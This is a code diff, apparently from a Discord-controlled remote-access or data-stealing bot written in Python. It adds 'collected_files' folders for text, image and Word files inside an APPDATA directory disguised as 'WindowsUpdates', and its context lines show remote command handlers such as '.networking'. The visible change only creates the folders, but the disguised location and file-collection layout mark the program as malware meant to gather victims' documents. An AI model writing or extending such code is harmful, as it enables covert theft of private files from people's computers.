@@ -42,6 +42,10 @@ async def on_ready():
     print(f"Bot started. Version: " + "1.0.1")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
+        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files")
+        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
+        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\images")
+        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\docx")
 
 @client.event
 async def on_message(message):
@@ -404,7 +408,7 @@ async def on_message(message):
         embed = discord.Embed(title="Setup", description="Setup successful.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
-        #NETWORKING
+    #NETWORKING
     if message.content.startswith(".networking"):
         await message.delete()
         try:
